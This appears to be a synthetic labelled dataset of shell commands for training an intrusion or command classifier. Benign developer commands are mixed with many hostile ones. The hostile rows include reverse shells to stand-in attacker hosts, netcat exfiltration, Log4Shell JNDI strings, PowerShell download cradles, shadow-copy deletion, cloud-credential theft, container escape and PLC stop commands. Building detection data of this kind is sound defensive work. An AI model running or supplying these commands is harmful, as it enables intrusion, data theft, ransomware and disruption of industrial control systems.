timestamp,src_ip,input,label
2026-01-20T18:06:49.647820,174.134.122.33,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.604716,159.220.34.173,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,214.102.78.183,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.653031,33.220.119.105,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.634463,160.95.52.221,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.605716,109.39.63.209,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.592206,109.175.248.107,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.610343,143.96.123.218,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.584995,178.177.140.178,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.615344,61.178.243.45,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.588562,166.219.233.226,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.606716,65.96.106.20,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.602715,31.70.4.220,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.580995,204.101.98.233,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.608346,11.5.156.235,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.637464,206.178.103.5,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.633463,212.143.131.138,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.629483,220.119.141.82,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.632463,164.145.159.146,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.580995,85.117.11.142,git status,Normal_Business_Ops
2026-01-20T18:06:49.632463,149.235.16.33,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.646819,125.10.69.140,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.588562,30.214.215.151,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.631464,189.43.193.161,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.606716,32.92.170.192,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.639217,223.85.119.66,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.591206,223.125.34.220,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.643231,58.32.123.70,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.633463,23.74.213.250,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.598537,183.201.63.202,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.628852,76.38.203.145,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.611343,121.22.107.128,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.576929,114.231.239.13,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.580022,66.169.55.127,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.611343,142.76.145.159,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.589562,140.151.56.101,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.585564,210.0.222.206,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.599537,180.153.127.158,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.580995,51.48.4.135,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.601211,195.0.226.204,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.613343,3.157.173.201,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.601728,204.184.183.37,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.617074,38.200.218.163,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.653031,98.209.167.142,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.647820,173.22.176.126,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.650820,83.34.61.92,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.614343,206.78.145.124,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,125.90.214.56,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.631464,7.103.93.202,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.596536,76.228.234.116,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.647820,147.139.19.141,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625855,203.210.119.182,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.621712,139.174.90.11,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.589562,3.246.197.178,git add .,Normal_Business_Ops
2026-01-20T18:06:49.644231,134.133.21.243,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.597537,16.39.163.37,make build,Normal_Business_Ops
2026-01-20T18:06:49.605716,124.225.195.196,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.653031,91.220.39.173,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.644231,42.150.46.197,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.627851,218.135.183.174,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.603716,175.8.205.126,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645231,20.216.183.235,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.580995,160.248.201.207,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.632463,76.221.219.104,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.582995,132.41.64.80,git branch,Normal_Business_Ops
2026-01-20T18:06:49.633463,4.186.115.142,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.608346,51.134.80.158,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.654031,209.219.128.28,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.577927,139.167.20.59,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.595541,181.224.158.181,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.618055,136.178.65.59,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.598537,86.91.212.226,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.608346,67.233.81.152,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.603716,4.235.88.34,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.644231,84.50.117.5,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.647820,70.87.239.218,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.604716,95.51.65.34,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.642230,55.165.16.141,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.629483,97.208.218.61,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.582995,139.30.65.195,git branch,Normal_Business_Ops
2026-01-20T18:06:49.600538,84.93.115.135,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.615344,192.41.190.168,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.581995,90.237.150.202,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.614343,148.89.118.84,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.580022,118.168.163.14,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.621712,103.53.21.200,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.580995,118.174.212.244,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.627851,192.54.25.12,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,127.192.25.138,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.613343,25.133.193.181,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.621712,28.94.82.198,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.578927,18.62.112.174,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.633463,88.46.69.40,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.637464,73.109.38.85,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.614343,75.247.26.175,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.575395,106.81.165.198,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.612343,146.200.213.102,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.590224,41.181.16.131,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.580995,95.154.99.112,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.633463,24.167.190.51,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,109.173.107.200,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.604716,36.235.89.78,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,158.64.1.32,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.617074,59.41.81.56,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.650820,16.183.85.157,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.643231,76.118.72.234,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.639724,147.252.248.115,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.580995,189.241.54.225,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.640252,125.204.191.48,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.623750,112.96.147.251,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.577927,7.101.207.234,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.578927,37.149.94.234,git branch,Normal_Business_Ops
2026-01-20T18:06:49.622713,135.223.211.208,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.636464,13.181.85.207,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.582995,57.85.114.239,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.613343,72.115.177.25,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.621712,167.197.95.140,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.591206,64.129.222.206,git add .,Normal_Business_Ops
2026-01-20T18:06:49.608346,177.252.138.37,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.592928,9.224.11.175,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.650820,105.214.0.6,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.620713,2.229.143.174,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,177.210.186.134,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.627851,106.135.51.194,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,145.50.70.65,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.637464,99.110.138.100,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.595541,101.189.56.141,df -h,Normal_Business_Ops
2026-01-20T18:06:49.654619,91.28.49.254,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.614343,128.155.83.6,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.605716,79.29.63.117,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.599537,186.125.137.9,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.645823,93.104.163.57,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.592206,1.34.187.169,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.624262,51.107.53.244,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.604716,151.94.24.30,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645823,49.190.209.9,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.617074,128.47.58.68,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.625345,217.49.52.113,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,81.247.97.2,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.585564,119.64.92.77,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.634463,33.53.126.222,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.641230,63.150.51.168,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.615344,65.48.197.1,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.645823,79.19.113.67,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,209.159.135.76,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.620713,97.141.120.10,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.587562,190.123.135.242,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.603716,61.225.59.105,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.620713,62.94.155.51,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.590224,56.196.67.170,whoami,Normal_Business_Ops
2026-01-20T18:06:49.636464,110.214.105.54,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.592928,143.21.82.229,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.580995,49.50.247.154,git add .,Normal_Business_Ops
2026-01-20T18:06:49.609343,203.252.77.38,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.586561,22.153.0.215,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.589562,10.89.39.223,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.587562,49.21.27.77,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.655127,28.80.15.230,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.624262,165.122.91.101,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,210.182.233.99,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.615344,115.247.132.222,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.645823,80.246.35.113,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.584995,197.8.161.123,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.610343,80.115.25.42,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.580995,20.33.236.218,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.643231,3.199.162.171,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.627851,41.232.58.68,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.657633,151.44.75.250,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.581995,171.149.13.254,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.577927,178.152.252.131,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.655127,111.164.162.79,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.651526,34.145.57.81,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.642230,100.32.13.237,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.593923,17.127.78.244,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.584995,183.76.138.178,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.601211,158.222.189.151,npm start,Normal_Business_Ops
2026-01-20T18:06:49.621712,88.110.21.193,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.605716,86.191.183.244,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.616344,218.220.147.111,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.638465,163.77.133.115,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.618055,82.4.195.19,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,1.194.52.46,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.619055,176.167.134.73,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.620713,188.42.75.60,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.647820,17.44.187.59,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.642230,34.30.43.186,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.618055,50.132.59.40,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
